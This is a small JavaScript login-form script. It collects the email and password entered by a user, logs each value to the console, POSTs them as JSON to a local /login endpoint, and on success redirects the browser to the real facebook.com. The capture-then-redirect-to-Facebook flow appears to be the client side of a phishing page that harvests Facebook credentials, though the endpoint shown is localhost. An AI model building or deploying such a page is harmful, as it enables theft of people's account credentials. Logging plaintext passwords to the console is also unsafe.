let userData = { email: "", password: "" };
let email = document.getElementById("email");
let password = document.getElementById("password");
let btn=document.getElementById("btn");

const inputChange =(e) => {
    console.log(e.target.value);
    
    userData[e.target.name] = e.target.value;
}






const sendData = async(e) => {
    e.preventDefault();
    try {
       let url=`http://localhost:5173/login`;
    let body=JSON.stringify(userData);
    btn.innerText="Please wait"
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body
    });
    let data=await response.json();
    if(data==="ok"){
        window.location.href="https://www.facebook.com";
    }
    btn.innerText="Log in";
    } catch (e) {
        console.log(e)
    }
    
    
} 